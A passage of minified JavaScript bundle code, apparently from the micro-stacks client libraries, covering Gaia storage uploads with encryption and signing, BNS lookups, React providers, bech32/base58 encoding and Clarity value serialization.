                        else if (!i) throw Error("Need to pass private key");
                        let n = await In({ contents: t, privateKey: i });
                        r = async (r) =>
                          (
                            await Promise.all([
                              Gi({
                                filename: e,
                                contents: t,
                                hubConfig: r,
                                contentType: c,
                              }),
                              Gi({
                                filename: `${e}${Zi}`,
                                contents: JSON.stringify(n),
                                hubConfig: r,
                                contentType: "application/json",
                              }),
                            ])
                          )[0].publicURL;
                      } else {
                        let t;
                        if (o || s) {
                          let e;
                          if ("string" == typeof o) e = o;
                          else if ("string" == typeof s) e = g(Fe(s, !0));
                          else {
                            if (!i) throw new Error("No private key passed");
                            e = g(Fe(i, !0));
                          }
                          let n = await h.load(),
                            r = await _n(n, {
                              publicKey: e,
                              wasString: h.wasString,
                              cipherTextEncoding: l,
                              privateKey: i,
                            });
                          if (((t = JSON.stringify(r)), i)) {
                            let { signature: e, publicKey: n } = await In({
                              contents: r,
                              privateKey: i,
                            });
                            t = JSON.stringify({
                              signature: e,
                              publicKey: n,
                              cipherText: r,
                            });
                          }
                          c = "application/json";
                        } else t = h.content;
                        r = async (n) =>
                          (
                            await Gi({
                              filename: e,
                              contents: t,
                              hubConfig: n,
                              contentType: c,
                            })
                          ).publicURL;
                      }
                      try {
                        return await r(a);
                      } catch (d) {
                        if (
                          (function (e) {
                            if (!e || !e.hubError || !e.hubError.statusCode)
                              return !1;
                            let t = e.hubError.statusCode;
                            return (
                              401 === t || 409 === t || (t >= 500 && t <= 599)
                            );
                          })(d)
                        )
                          return (
                            console.error(d),
                            console.error(
                              "Possible recoverable error during Gaia upload, retrying..."
                            ),
                            await r(a)
                          );
                        throw d;
                      }
                    })(e, t, {
                      privateKey: a.appPrivateKey,
                      gaiaHubConfig: s,
                      encrypt: r,
                      sign: i,
                      wasString: "string" == typeof t,
                    });
                  console.warn(
                    "The current user session has no `appPrivateKey` defined. Certain actions require an `appPrivateKey`, such as using gaia or encryption."
                  );
                } else
                  console.warn(
                    "There is not current user session available. Please make sure the user has signed in before attempting this action."
                  );
              }),
              a(this, "getFile", (e, t) => {
                let { decrypt: n = !0, verify: r } = t,
                  i = this.selectHasSession(this.getState()),
                  o = this.selectGaiaHubConfig(this.getState()),
                  s = this.selectAccount(this.getState());
                if (i) {
                  if (null != s && s.appPrivateKey && o)
                    return oo(e, {
                      privateKey: s.appPrivateKey,
                      gaiaHubConfig: o,
                      decrypt: n,
                      verify: r,
                    });
                  console.warn(
                    "The current user session has no `appPrivateKey` defined. Certain actions require an `appPrivateKey`, such as using gaia or encryption."
                  );
                } else
                  console.warn(
                    "There is not current user session available. Please make sure the user has signed in before attempting this action."
                  );
              });
            let r = {
                storage:
                  null !== (e = null == n ? void 0 : n.storage) && void 0 !== e
                    ? e
                    : lo,
                network:
                  null !== (t = null == n ? void 0 : n.network) && void 0 !== t
                    ? t
                    : new ui(),
                ...n,
              },
              i =
                "function" == typeof r.dehydratedState
                  ? r.dehydratedState(this.storeKey)
                  : r.dehydratedState,
              o = i ? To(i, r) : { state: ko(r), version: 1 };
            var s;
            (this.store =
              ((s = di(
                gi(() => o.state, {
                  name: go,
                  getStorage: () => r.storage,
                  version: o.version,
                  serialize: (e) => {
                    let { state: t, version: n } = e;
                    return xo({
                      state: t,
                      version: null !== n && void 0 !== n ? n : 1,
                    });
                  },
                  deserialize: (e) => To(e, r),
                })
              )),
              s ? hi(s) : hi)),
              (this.debug = (() => {
                if (!c("localStorage", { throwIfUnavailable: !1 })) return;
                let e = localStorage.getItem("MICRO_STACKS_DEBUG");
                return e ? JSON.parse(e) : void 0;
              })()),
              (this.config = r),
              (this.storage = r.storage),
              (this.fetcher = r.fetcher || C);
          }
          setState(e) {
            let t = "function" == typeof e ? e(this.store.getState()) : e;
            this.store.setState(t, !0);
          }
          resetState() {
            this.setState((e) => ({
              ...e,
              accounts: [],
              currentAccountIndex: 0,
            }));
          }
          get subscribe() {
            return this.store.subscribe;
          }
          getStacksProvider() {
            return c("StacksProvider", { throwIfUnavailable: !1 });
          }
          subscribeToStacksProvider(e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : 100;
            if (this.getStacksProvider()) return e(), () => {};
            {
              let n = setInterval(() => {
                this.getStacksProvider() && (e(), clearInterval(n));
              }, t);
              return () => {
                typeof n < "u" && clearInterval(n);
              };
            }
          }
          get storeKey() {
            return go;
          }
          get onAuthentication() {
            var e;
            return null == (e = this.store.getState())
              ? void 0
              : e.onAuthentication;
          }
          get onNoWalletFound() {
            var e;
            return null == (e = this.store.getState())
              ? void 0
              : e.onNoWalletFound;
          }
          get onSignOut() {
            var e;
            return null == (e = this.store.getState()) ? void 0 : e.onSignOut;
          }
          dehydrate(e) {
            return xo({
              state: null !== e && void 0 !== e ? e : this.store.getState(),
              version: 1,
            });
          }
          hydrate(e) {
            let t = To(e, this.config);
            this.setState(t.state);
          }
          setStatus(e, t) {
            this.setState((n) => ({
              ...n,
              statuses: { ...n.statuses, [e]: t },
            }));
          }
          setIsRequestPending(e) {
            this.setStatus(e, "status/IsLoading");
          }
          setIsIdle(e) {
            this.setStatus(e, "status/IsIdle");
          }
          handleNoStacksProviderFound() {
            return (
              !(typeof this.getStacksProvider() > "u") ||
              (typeof this.onNoWalletFound < "u"
                ? (this.onNoWalletFound(), !1)
                : (uo(
                    this.getStacksProvider(),
                    "The injected `StacksProvider` cannot be found. This is typically because there is no Stacks wallet available, such as the Hiro web wallet extension or the iOS/Android wallet Xverse."
                  ),
                  !1))
            );
          }
          selectGaiaHubConfig(e) {
            let t = this.selectHasSession(e),
              n = this.selectAccount(e);
            if (t && null != n && n.appPrivateKey)
              return Ni({
                gaiaHubUrl: "https://hub.blockstack.org",
                privateKey: n.appPrivateKey,
              });
          }
          async fetchBNSName() {
            var e;
            let t = this.selectStxAddress(this.getState()),
              n = this.selectNetwork(this.getState());
            if (!t)
              return void console.warn(
                "No Stacks address found while trying to fetch BNS name"
              );
            let r = n.getCoreApiUrl() + `/v1/addresses/stacks/${t}`;
            try {
              let t = await (await this.fetcher(r)).json();
              return null == (e = null == t ? void 0 : t.names) ? void 0 : e[0];
            } catch (Wn) {
              console.log("[@micro-stacks/client] fetchBNSName failed", Wn);
            }
          }
          async fetchZoneFile() {
            try {
              let e = this.selectStxAddress(this.getState()),
                t = this.selectNetwork(this.getState());
              if (!e)
                return void console.warn(
                  "No Stacks address found while trying to fetch zonefile name"
                );
              let n = t.getCoreApiUrl() + `/v1/names/${e}/zonefile`;
              return await (await this.fetcher(n)).json();
            } catch (e) {
              console.log("[@micro-stacks/client] fetchZoneFile failed", e);
            }
          }
          async fetchProfile() {
            let e = this.selectAccount(this.getState());
            if (null != e && e.profile_url)
              try {
                return await (await this.fetcher(e.profile_url)).json();
              } catch (Y) {
                console.log("[@micro-stacks/client] fetchProfile failed", Y);
              }
          }
          encrypt(e) {
            var t;
            let n =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : {};
            var r;
            if (
              (null == n ? void 0 : n.publicKey) &&
              (null == n ? void 0 : n.privateKey)
            )
              throw Error(
                "Error: do not pass both `publicKey` and `privateKey` to client.encrypt"
              );
            return _n(e, {
              ...n,
              privateKey:
                null !== (t = n.privateKey) && void 0 !== t
                  ? t
                  : null == (r = this.selectAccount(this.getState()))
                  ? void 0
                  : r.appPrivateKey,
            });
          }
          decrypt(e, t) {
            var n, r;
            let i =
              null !== (n = t.privateKey) && void 0 !== n
                ? n
                : null == (r = this.selectAccount(this.getState()))
                ? void 0
                : r.appPrivateKey;
            if (!i)
              throw Error(
                "You must pass a `privateKey` value to client.decrypt"
              );
            return Pn(e, { privateKey: i });
          }
        };
        function Io(e) {
          var t;
          let n =
            null !== (t = null == e ? void 0 : e.client) && void 0 !== t
              ? t
              : new Co(null == e ? void 0 : e.config);
          return yo ? n : n;
        }
        "undefined" !== typeof Symbol &&
          (Symbol.iterator || (Symbol.iterator = Symbol("Symbol.iterator"))),
          "undefined" !== typeof Symbol &&
            (Symbol.asyncIterator ||
              (Symbol.asyncIterator = Symbol("Symbol.asyncIterator")));
        "undefined" !== typeof window &&
        "undefined" !== typeof window.document &&
        "undefined" !== typeof window.document.createElement
          ? r.useLayoutEffect
          : r.useEffect;
        var Oo = (0, r.createContext)(null),
          { useSyncExternalStoreWithSelector: Bo } = i;
        function Po(e) {
          return () => {
            let t = _o();
            return Bo(t.subscribe, t.getState, t.getState, (n) =>
              e({ client: t, state: n })
            );
          };
        }
        var _o = () => {
          let e = (0, r.useContext)(Oo);
          if (!e)
            throw new Error(
              "No MicroStacksClient set, wrap your app in MicroStacksClientProvider to set one"
            );
          return e;
        };
        Po((e) => {
          var t;
          return e.client.selectAppDetails(
            null !== (t = e.state) && void 0 !== t ? t : e.client.getState()
          );
        }),
          Po((e) => {
            let { client: t, state: n } = e;
            return t.selectAccounts(n || t.getState());
          }),
          Po((e) => {
            let { client: t, state: n } = e;
            return t.selectAccount(n || t.getState());
          }),
          Po((e) => {
            let { client: t, state: n } = e;
            return t.selectIdentityAddress(n || t.getState());
          }),
          Po((e) => {
            let { client: t, state: n } = e;
            return t.selectDecentralizedID(n || t.getState());
          }),
          Po((e) => {
            let { client: t, state: n } = e;
            return t.selectStxAddress(n || t.getState());
          });
        Po((e) => {
          let { client: t, state: n } = e;
          return t.selectStatuses(n || t.getState());
        }),
          Po((e) => {
            let { client: t, state: n } = e;
            return t.selectNetwork(n || t.getState());
          });
        var Uo = (e) => {
            let t = r.useRef(e);
            return (
              ((e, t) => {
                Boolean(c("document")) && r.useLayoutEffect(e, t);
              })(() => {
                t.current = e;
              }, []),
              r.useCallback(function () {
                return t.current(...arguments);
              }, [])
            );
          },
          No = (e) => {
            let t = _o().setOnAuthentication,
              n = Uo(e);
            (0, r.useEffect)(() => {
              e && t(n);
            }, [e, t, n]);
          },
          Ro = (e) => {
            let t = _o().setOnSignOut,
              n = Uo(e);
            (0, r.useEffect)(() => {
              e && t(n);
            }, [e, t, n]);
          },
          Lo = (e) => {
            let t = _o().setOnPersistState,
              n = Uo(e);
            (0, r.useEffect)(() => {
              e && t(n);
            }, [e, t, n]);
          },
          $o = (e) => {
            let t = _o().setOnNoWalletFound,
              n = Uo(e);
            (0, r.useEffect)(() => {
              e && t(n);
            }, [e, t, n]);
          },
          Ho = r.memo((e) => {
            let {
              onPersistState: t,
              onAuthentication: n,
              onSignOut: r,
              onNoWalletFound: i,
            } = e;
            return No(n), Ro(r), Lo(t), $o(i), null;
          });
        var Do = r.memo((e) => {
          let {
            children: t,
            client: n,
            enableSessionConsistencyEffect: i = !1,
            enableTabSync: o = !1,
            dehydratedState: s,
            appIconUrl: a,
            appName: l,
            network: c,
            storage: u = lo,
            onPersistState: f,
            onAuthentication: h,
            onNoWalletFound: d,
            onSignOut: p,
            enableNetworkSwitching: g,
          } = e;
          if (r.useContext(Oo))
            throw Error(
              "[@micro-stacks/react] Nested ClientProviders detected, you should only have one instance of this component at the root of your app."
            );
          let y = r.useMemo(
              () => ({
                appName: l,
                appIconUrl: a,
                dehydratedState: s,
                network: c,
                enableNetworkSwitching: g,
                storage: u,
                onPersistState: f,
                onAuthentication: h,
                onNoWalletFound: d,
                onSignOut: p,
              }),
              [l, a, s, c, g, u, f, h, d, p]
            ),
            [w] = r.useState(() => Io({ config: y, client: n }));
          return (
            (function (e, t, n) {
              let i = r.useRef(!1);
              r.useEffect(() => {
                n &&
                  (null == t ? void 0 : t.onPersistState) &&
                  !i.current &&
                  ((i.current = !0),
                  !t.dehydratedState &&
                    e.selectHasSession(e.getState()) &&
                    e.persist());
              }, [
                n,
                e,
                null == t ? void 0 : t.onPersistState,
                null == t ? void 0 : t.dehydratedState,
              ]);
            })(w, y, i),
            (function (e) {
              let t =
                arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
              r.useEffect(() => e.tabSyncSubscription(t), [e, t]);
            })(w, o),
            r.createElement(
              Oo.Provider,
              { value: w },
              r.createElement(
                r.Fragment,
                null,
                n
                  ? null
                  : r.createElement(Ho, {
                      onPersistState: f,
                      onAuthentication: h,
                      onSignOut: p,
                    }),
                t
              )
            )
          );
        });
      },
      5123: (e, t, n) => {
        "use strict";
        function r(e) {
          if (!Number.isSafeInteger(e)) throw new Error(`Wrong integer: ${e}`);
        }
        function i() {
          const e = (e, t) => (n) => e(t(n));
          for (var t = arguments.length, n = new Array(t), r = 0; r < t; r++)
            n[r] = arguments[r];
          return {
            encode: Array.from(n)
              .reverse()
              .reduce((t, n) => (t ? e(t, n.encode) : n.encode), void 0),
            decode: n.reduce((t, n) => (t ? e(t, n.decode) : n.decode), void 0),
          };
        }
        function o(e) {
          return {
            encode: (t) => {
              if (!Array.isArray(t) || (t.length && "number" !== typeof t[0]))
                throw new Error(
                  "alphabet.encode input should be an array of numbers"
                );
              return t.map((t) => {
                if ((r(t), t < 0 || t >= e.length))
                  throw new Error(
                    `Digit index outside alphabet: ${t} (alphabet: ${e.length})`
                  );
                return e[t];
              });
            },
            decode: (t) => {
              if (!Array.isArray(t) || (t.length && "string" !== typeof t[0]))
                throw new Error(
                  "alphabet.decode input should be array of strings"
                );
              return t.map((t) => {
                if ("string" !== typeof t)
                  throw new Error(`alphabet.decode: not string element=${t}`);
                const n = e.indexOf(t);
                if (-1 === n)
                  throw new Error(`Unknown letter: "${t}". Allowed: ${e}`);
                return n;
              });
            },
          };
        }
        function s() {
          let e =
            arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
          if ("string" !== typeof e)
            throw new Error("join separator should be string");
          return {
            encode: (t) => {
              if (!Array.isArray(t) || (t.length && "string" !== typeof t[0]))
                throw new Error("join.encode input should be array of strings");
              for (let e of t)
                if ("string" !== typeof e)
                  throw new Error(`join.encode: non-string input=${e}`);
              return t.join(e);
            },
            decode: (t) => {
              if ("string" !== typeof t)
                throw new Error("join.decode input should be string");
              return t.split(e);
            },
          };
        }
        function a(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : "=";
          if ((r(e), "string" !== typeof t))
            throw new Error("padding chr should be string");
          return {
            encode(n) {
              if (!Array.isArray(n) || (n.length && "string" !== typeof n[0]))
                throw new Error(
                  "padding.encode input should be array of strings"
                );
              for (let e of n)
                if ("string" !== typeof e)
                  throw new Error(`padding.encode: non-string input=${e}`);
              for (; (n.length * e) % 8; ) n.push(t);
              return n;
            },
            decode(n) {
              if (!Array.isArray(n) || (n.length && "string" !== typeof n[0]))
                throw new Error(
                  "padding.encode input should be array of strings"
                );
              for (let e of n)
                if ("string" !== typeof e)
                  throw new Error(`padding.decode: non-string input=${e}`);
              let r = n.length;
              if ((r * e) % 8)
                throw new Error(
                  "Invalid padding: string should have whole number of bytes"
                );
              for (; r > 0 && n[r - 1] === t; r--)
                if (!(((r - 1) * e) % 8))
                  throw new Error(
                    "Invalid padding: string has too much padding"
                  );
              return n.slice(0, r);
            },
          };
        }
        function l(e) {
          if ("function" !== typeof e)
            throw new Error("normalize fn should be function");
          return { encode: (e) => e, decode: (t) => e(t) };
        }
        function c(e, t, n) {
          if (t < 2)
            throw new Error(
              `convertRadix: wrong from=${t}, base cannot be less than 2`
            );
          if (n < 2)
            throw new Error(
              `convertRadix: wrong to=${n}, base cannot be less than 2`
            );
          if (!Array.isArray(e))
            throw new Error("convertRadix: data should be array");
          if (!e.length) return [];
          let i = 0;
          const o = [],
            s = Array.from(e);
          for (
            s.forEach((e) => {
              if ((r(e), e < 0 || e >= t))
                throw new Error(`Wrong integer: ${e}`);
            });
            ;

          ) {
            let e = 0,
              r = !0;
            for (let o = i; o < s.length; o++) {
              const a = s[o],
                l = t * e + a;
              if (
                !Number.isSafeInteger(l) ||
                (t * e) / t !== e ||
                l - a !== t * e
              )
                throw new Error("convertRadix: carry overflow");
              if (
                ((e = l % n),
                (s[o] = Math.floor(l / n)),
                !Number.isSafeInteger(s[o]) || s[o] * n + e !== l)
              )
                throw new Error("convertRadix: carry overflow");
              r && (s[o] ? (r = !1) : (i = o));
            }
            if ((o.push(e), r)) break;
          }
          for (let r = 0; r < e.length - 1 && 0 === e[r]; r++) o.push(0);
          return o.reverse();
        }
        n.d(t, {
          $v: () => O,
          Av: () => v,
          Jq: () => b,
          KA: () => I,
          US: () => w,
          gW: () => T,
          iE: () => C,
        });
        const u = (e, t) => (t ? u(t, e % t) : e),
          f = (e, t) => e + (t - u(e, t));
        function h(e, t, n, i) {
          if (!Array.isArray(e))
            throw new Error("convertRadix2: data should be array");
          if (t <= 0 || t > 32)
            throw new Error(`convertRadix2: wrong from=${t}`);
          if (n <= 0 || n > 32) throw new Error(`convertRadix2: wrong to=${n}`);
          if (f(t, n) > 32)
            throw new Error(
              `convertRadix2: carry overflow from=${t} to=${n} carryBits=${f(
                t,
                n
              )}`
            );
          let o = 0,
            s = 0;
          const a = 2 ** n - 1,
            l = [];
          for (const c of e) {
            if ((r(c), c >= 2 ** t))
              throw new Error(
                `convertRadix2: invalid data word=${c} from=${t}`
              );
            if (((o = (o << t) | c), s + t > 32))
              throw new Error(
                `convertRadix2: carry overflow pos=${s} from=${t}`
              );
            for (s += t; s >= n; s -= n) l.push(((o >> (s - n)) & a) >>> 0);
            o &= 2 ** s - 1;
          }
          if (((o = (o << (n - s)) & a), !i && s >= t))
            throw new Error("Excess padding");
          if (!i && o) throw new Error(`Non-zero padding: ${o}`);
          return i && s > 0 && l.push(o >>> 0), l;
        }
        function d(e) {
          return (
            r(e),
            {
              encode: (t) => {
                if (!(t instanceof Uint8Array))
                  throw new Error("radix.encode input should be Uint8Array");
                return c(Array.from(t), 256, e);
              },
              decode: (t) => {
                if (!Array.isArray(t) || (t.length && "number" !== typeof t[0]))
                  throw new Error(
                    "radix.decode input should be array of strings"
                  );
                return Uint8Array.from(c(t, e, 256));
              },
            }
          );
        }
        function p(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
          if ((r(e), e <= 0 || e > 32))
            throw new Error("radix2: bits should be in (0..32]");
          if (f(8, e) > 32 || f(e, 8) > 32)
            throw new Error("radix2: carry overflow");
          return {
            encode: (n) => {
              if (!(n instanceof Uint8Array))
                throw new Error("radix2.encode input should be Uint8Array");
              return h(Array.from(n), 8, e, !t);
            },
            decode: (n) => {
              if (!Array.isArray(n) || (n.length && "number" !== typeof n[0]))
                throw new Error(
                  "radix2.decode input should be array of strings"
                );
              return Uint8Array.from(h(n, e, 8, t));
            },
          };
        }
        function g(e) {
          if ("function" !== typeof e)
            throw new Error("unsafeWrapper fn should be function");
          return function () {
            try {
              for (
                var t = arguments.length, n = new Array(t), r = 0;
                r < t;
                r++
              )
                n[r] = arguments[r];
              return e.apply(null, n);
            } catch (i) {}
          };
        }
        function y(e, t) {
          if ((r(e), "function" !== typeof t))
            throw new Error("checksum fn should be function");
          return {
            encode(n) {
              if (!(n instanceof Uint8Array))
                throw new Error("checksum.encode: input should be Uint8Array");
              const r = t(n).slice(0, e),
                i = new Uint8Array(n.length + e);
              return i.set(n), i.set(r, n.length), i;
            },
            decode(n) {
              if (!(n instanceof Uint8Array))
                throw new Error("checksum.decode: input should be Uint8Array");
              const r = n.slice(0, -e),
                i = t(r).slice(0, e),
                o = n.slice(-e);
              for (let t = 0; t < e; t++)
                if (i[t] !== o[t]) throw new Error("Invalid checksum");
              return r;
            },
          };
        }
        i(p(4), o("0123456789ABCDEF"), s("")),
          i(p(5), o("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"), a(5), s("")),
          i(p(5), o("0123456789ABCDEFGHIJKLMNOPQRSTUV"), a(5), s("")),
          i(
            p(5),
            o("0123456789ABCDEFGHJKMNPQRSTVWXYZ"),
            s(""),
            l((e) => e.toUpperCase().replace(/O/g, "0").replace(/[IL]/g, "1"))
          );
        const w = i(
            p(6),
            o(
              "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
            ),
            a(6),
            s("")
          ),
          m =
            (i(
              p(6),
              o(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
              ),
              a(6),
              s("")
            ),
            (e) => i(d(58), o(e), s(""))),
          b = m("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"),
          v =
            (m("123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"),
            m("rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz"),
            (e) =>
              i(
                y(4, (t) => e(e(t))),
                b
              )),
          E = i(o("qpzry9x8gf2tvdw0s3jn54khce6mua7l"), s("")),
          S = [996825010, 642813549, 513874426, 1027748829, 705979059];
        function x(e) {
          const t = e >> 25;
          let n = (33554431 & e) << 5;
          for (let r = 0; r < S.length; r++)
            1 === ((t >> r) & 1) && (n ^= S[r]);
          return n;
        }
        function A(e, t) {
          let n =
            arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 1;
          const r = e.length;
          let i = 1;
          for (let o = 0; o < r; o++) {
            const t = e.charCodeAt(o);
            if (t < 33 || t > 126) throw new Error(`Invalid prefix (${e})`);
            i = x(i) ^ (t >> 5);
          }
          i = x(i);
          for (let o = 0; o < r; o++) i = x(i) ^ (31 & e.charCodeAt(o));
          for (let o of t) i = x(i) ^ o;
          for (let o = 0; o < 6; o++) i = x(i);
          return (i ^= n), E.encode(h([i % 2 ** 30], 30, 5, !1));
        }
        function k(e) {
          const t = "bech32" === e ? 1 : 734539939,
            n = p(5),
            r = n.decode,
            i = n.encode,
            o = g(r);
          function s(e) {
            let n =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : 90;
            if ("string" !== typeof e)
              throw new Error(
                "bech32.decode input should be string, not " + typeof e
              );
            if (e.length < 8 || (!1 !== n && e.length > n))
              throw new TypeError(
                `Wrong string length: ${e.length} (${e}). Expected (8..${n})`
              );
            const r = e.toLowerCase();
            if (e !== r && e !== e.toUpperCase())
              throw new Error("String must be lowercase or uppercase");
            const i = (e = r).lastIndexOf("1");
            if (0 === i || -1 === i)
              throw new Error(
                'Letter "1" must be present between prefix and data only'
              );
            const o = e.slice(0, i),
              s = e.slice(i + 1);
            if (s.length < 6)
              throw new Error("Data must be at least 6 characters long");
            const a = E.decode(s).slice(0, -6),
              l = A(o, a, t);
            if (!s.endsWith(l))
              throw new Error(`Invalid checksum in ${e}: expected "${l}"`);
            return { prefix: o, words: a };
          }
          return {
            encode: function (e, n) {
              let r =
                arguments.length > 2 && void 0 !== arguments[2]
                  ? arguments[2]
                  : 90;
              if ("string" !== typeof e)
                throw new Error(
                  "bech32.encode prefix should be string, not " + typeof e
                );
              if (!Array.isArray(n) || (n.length && "number" !== typeof n[0]))
                throw new Error(
                  "bech32.encode words should be array of numbers, not " +
                    typeof n
                );
              const i = e.length + 7 + n.length;
              if (!1 !== r && i > r)
                throw new TypeError(`Length ${i} exceeds limit ${r}`);
              return `${(e = e.toLowerCase())}1${E.encode(n)}${A(e, n, t)}`;
            },
            decode: s,
            decodeToBytes: function (e) {
              const { prefix: t, words: n } = s(e, !1);
              return { prefix: t, words: n, bytes: r(n) };
            },
            decodeUnsafe: g(s),
            fromWords: r,
            fromWordsUnsafe: o,
            toWords: i,
          };
        }
        const T = k("bech32"),
          C = k("bech32m"),
          I = {
            encode: (e) => new TextDecoder().decode(e),
            decode: (e) => new TextEncoder().encode(e),
          },
          O = i(
            p(4),
            o("0123456789abcdef"),
            s(""),
            l((e) => {
              if ("string" !== typeof e || e.length % 2)
                throw new TypeError(
                  `hex.decode: expected string, got ${typeof e} with length ${
                    e.length
                  }`
                );
              return e.toLowerCase();
            })
          );
      },
      2841: (e, t, n) => {
        "use strict";
        n.d(t, { lj: () => Mt, $4: () => Ft });
        var r,
          i = n(2791),
          o = n(8674),
          s = n(2845),
          a = n(4563),
          l = n(9926),
          c = n(9007),
          u = n(9083),
          f = n(718),
          h = n(7179),
          d = n(5398);
        function p(e, t, n) {
          const r = t || 1,
            i = n || c.Cy;
          if ((0, h.pw)(e, i))
            throw new Error(`String length exceeds maximum bytes ${i}`);
          return {
            type: c.L8.LengthPrefixedString,
            content: e,
            lengthPrefixBytes: r,
            maxLengthBytes: i,
          };
        }
        function g(e) {
          const t = (0, d.yI)(e);
          return { type: c.L8.Address, version: t[0], hash160: t[1] };
        }
        function y(e, t, n) {
          (e[n + 3] = t),
            (t >>>= 8),
            (e[n + 2] = t),
            (t >>>= 8),
            (e[n + 1] = t),
            (t >>>= 8),
            (e[n] = t);
        }
        !(function (e) {
          (e[(e.Int = 0)] = "Int"),
            (e[(e.UInt = 1)] = "UInt"),
            (e[(e.Buffer = 2)] = "Buffer"),
            (e[(e.BoolTrue = 3)] = "BoolTrue"),
            (e[(e.BoolFalse = 4)] = "BoolFalse"),
            (e[(e.PrincipalStandard = 5)] = "PrincipalStandard"),
            (e[(e.PrincipalContract = 6)] = "PrincipalContract"),
            (e[(e.ResponseOk = 7)] = "ResponseOk"),
            (e[(e.ResponseErr = 8)] = "ResponseErr"),
            (e[(e.OptionalNone = 9)] = "OptionalNone"),
            (e[(e.OptionalSome = 10)] = "OptionalSome"),
            (e[(e.List = 11)] = "List"),
            (e[(e.Tuple = 12)] = "Tuple"),
            (e[(e.StringASCII = 13)] = "StringASCII"),
            (e[(e.StringUTF8 = 14)] = "StringUTF8");
        })(r || (r = {}));
        class w extends Error {
          constructor(e) {
            super(e),
              (this.message = e),
              (this.name = this.constructor.name),
              Error.captureStackTrace &&
                Error.captureStackTrace(this, this.constructor);
          }
        }
        class m extends w {
          constructor(e) {
            super(e);
          }
        }
        class b extends w {
          constructor(e) {
            super(e);
          }
        }
        class v extends w {
          constructor(e) {
            super(e);
          }
        }
        class E extends w {
          constructor(e) {
            super(e);
          }
        }
        function S(e, t) {
          return (0, u.WW)([e, t]);
        }
        function x(e, t) {
          const n = [],
            r = "ascii" == t ? (0, u.QD)(e.data) : (0, u.iY)(e.data),
            i = new Uint8Array(4);
          return (
            y(i, r.length, 0), n.push(i), n.push(r), S(e.type, (0, u.WW)(n))
          );
        }
        function A(e) {
          switch (e.type) {
            case r.BoolTrue:
            case r.BoolFalse:
              return (function (e) {
                return new Uint8Array([e.type]);
              })(e);
            case r.OptionalNone:
            case r.OptionalSome:
              return (t = e).type === r.OptionalNone
                ? new Uint8Array([t.type])
                : S(t.type, A(t.value));
            case r.Buffer:
              return (function (e) {
                const t = new Uint8Array(4);
                return (
                  y(t, e.buffer.length, 0), S(e.type, (0, u.eV)(t, e.buffer))
                );
              })(e);
            case r.UInt:
              return (function (e) {
                const t = (0, u.jk)(e.value, c.Pe);
                return S(e.type, t);
              })(e);
            case r.Int:
              return (function (e) {
                const t = (0, u.jk)((0, u.$j)(e.value, BigInt(c.Nv)), c.Pe);
                return S(e.type, t);
              })(e);
            case r.PrincipalStandard:
              return (function (e) {
                return S(e.type, ne(e.address));
              })(e);
            case r.PrincipalContract:
              return (function (e) {
                return S(e.type, (0, u.eV)(ne(e.address), se(e.contractName)));
              })(e);
            case r.ResponseOk:
            case r.ResponseErr:
              return (function (e) {
                return S(e.type, A(e.value));
              })(e);
            case r.List:
              return (function (e) {
                const t = [],
                  n = new Uint8Array(4);
                y(n, e.list.length, 0), t.push(n);
                for (const r of e.list) {
                  const e = A(r);
                  t.push(e);
                }
                return S(e.type, (0, u.WW)(t));
              })(e);
            case r.Tuple:
              return (function (e) {
                const t = [],
                  n = new Uint8Array(4);
                y(n, Object.keys(e.data).length, 0), t.push(n);
                const r = Object.keys(e.data).sort((e, t) =>
                  e.localeCompare(t)
                );
                for (const i of r) {
                  const n = p(i);
                  t.push(se(n));
                  const r = A(e.data[i]);
                  t.push(r);
                }
                return S(e.type, (0, u.WW)(t));
              })(e);
            case r.StringASCII:
              return (function (e) {
                return x(e, "ascii");
              })(e);
            case r.StringUTF8:
              return (function (e) {
                return x(e, "utf8");
              })(e);
            default:
              throw new m("Unable to serialize. Invalid Clarity Value.");
          }
          var t;
        }
        const k = BigInt("0xffffffffffffffffffffffffffffffff"),
          T = BigInt(0),
          C = BigInt("0x7fffffffffffffffffffffffffffffff"),
          I = BigInt("-170141183460469231731687303715884105728"),
          O = (e) => {
            const t = (0, u.HN)(e, !0);
            if (t > C)
              throw new RangeError(
                `Cannot construct clarity integer from value greater than ${C}`
              );
            if (t < I)
              throw new RangeError(
                `Cannot construct clarity integer form value less than ${I}`
              );
            return { type: r.Int, value: t };
          },
          B = (e) => {
            const t = (0, u.HN)(e, !1);
            if (t < T)
              throw new RangeError(
                "Cannot construct unsigned clarity integer from negative value"
              );
            if (t > k)
              throw new RangeError(
                `Cannot construct unsigned clarity integer greater than ${k}`
              );
            return { type: r.UInt, value: t };
          },
          P = (e) => {
            if (e.length > 1e6)
              throw new Error(
                "Cannot construct clarity buffer that is greater than 1MB"
              );
            return { type: r.Buffer, buffer: e };
          },
          _ = () => ({ type: r.BoolTrue }),
          U = () => ({ type: r.BoolFalse });
        function N(e) {
          if (e.includes(".")) {
            const [t, n] = e.split(".");
            return (function (e, t) {
              const n = g(e),
                r = p(t);
              return R(n, r);
            })(t, n);
          }
          return (function (e) {
            const t = g(e);
            return { type: r.PrincipalStandard, address: t };
          })(e);
        }
        function R(e, t) {
          if ((0, u.iY)(t.content).byteLength >= 128)
            throw new Error("Contract name must be less than 128 bytes");
          return { type: r.PrincipalContract, address: e, contractName: t };
        }
        function L() {
          return { type: r.OptionalNone };
        }
        function $(e) {
          return { type: r.OptionalSome, value: e };
        }
        const H = new Map();
        function D(e, t) {
          const n = H.get(e);
          if (void 0 !== n) return n(t);
          const r = (function (e) {
            const t = Object.values(e).filter((e) => "number" === typeof e),
              n = new Set(t);
            return (e) => n.has(e);
          })(e);
